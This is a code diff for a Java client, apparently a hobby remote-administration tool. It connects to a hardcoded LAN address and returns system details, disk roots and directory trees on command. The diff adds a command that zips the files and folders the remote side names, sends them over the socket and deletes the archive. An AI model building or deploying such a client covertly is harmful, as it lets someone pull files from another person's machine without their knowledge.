@@ -4,9 +4,12 @@ import Client.InformationGathering.System.InfoObject;
 import Client.Tree.Tree;
 import Client.InformationGathering.System.SystemInformation;
 import Client.InformationGathering.System.SystemNetworkInformation;
+import net.lingala.zip4j.ZipFile;
 
 import java.io.*;
 import java.net.*;
+import java.util.ArrayList;
+import java.util.List;
 
 public class Client {
     private static final String IP = "192.168.1.133";
@@ -35,24 +38,33 @@ public class Client {
                     if (reader instanceof Object[]) {
                         output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
                     } else if (reader instanceof String e && e.equals("DISKS")) {
-                        File[] files = File.listRoots();
-                        String[] rutas = new String[files.length];
-                        for (int i = 0; i < files.length; i++) {
-                            rutas[i] = files[i].toString();
-                        }
-                        output.writeObject(rutas);
+                        output.writeObject(File.listRoots());
+
                     } else if (reader instanceof InfoObject e && e.getCommand().equals("TREE")) {
-                        System.out.println("Path recibido "+e.getPath());
+                        System.out.println("Path recibido " + e.getPath());
                         new Tree(e.getPath(), output).start();
                     } else if (reader instanceof String e && e.equals("SYS_DETAILS")) {
                         output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
-                    } else if (reader instanceof File file){
-                        FileInputStream fileInputStream = new FileInputStream(file);
-                        byte[]fileContentBytes = new byte[(int) file.length()];
+                    } else if (reader instanceof InfoObject e && e.getCommand().equals("DOWNLOAD")) {
+                        ArrayList<File>fileArray = new ArrayList<>(e.getFileArray());
+                        System.out.println(fileArray);
+                        ZipFile zipFile = new ZipFile("fichero.zip");
+                        for (File a : fileArray) {
+                            if (a.isDirectory()) {
+                                zipFile.addFolder(a);
+                            } else {
+                                zipFile.addFile(a);
+                            }
+                        }
+                        File zipToSend = zipFile.getFile();
+                        FileInputStream fileInputStream = new FileInputStream(zipToSend);
+                        byte[] fileContentBytes = new byte[(int) zipToSend.length()];
                         int length = fileInputStream.read(fileContentBytes);
                         fileInputStream.close();
                         dataOutput.writeInt(length);
                         dataOutput.write(fileContentBytes);
+                        zipToSend.delete();
+
                     }
 
                 } while (reader != null);
